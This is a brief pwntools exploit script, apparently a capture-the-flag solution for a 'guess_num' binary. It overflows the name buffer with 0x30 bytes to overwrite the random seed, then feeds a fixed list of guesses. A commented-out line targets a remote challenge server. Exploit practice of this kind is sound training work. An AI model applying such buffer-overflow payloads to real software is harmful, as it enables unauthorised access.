from pwn import *
from LibcSearcher import *
#覆盖随机数种子，使其产生的随机数固定
p=process('./guess_num')
# p=remote('61.147.171.105',63813)
elf=ELF('./guess_num')
context.log_level='debug'
# backdoor=0x0000000000000C3E
nums=[5 ,6, 4, 6, 6,2 ,3 ,6 ,2 ,2]
def guess(num):
    p.recvuntil(b'Please input your guess number:')
    p.sendline(str(num).encode())
pause()#有时候不暂停一下连不上远程
p.recvuntil(b'Your name:')
payload=b'a'*0x30
p.sendline(payload)
for i in nums:
    guess(i)
p.interactive()

# 5 6 4 6 6 2 3 6 2 2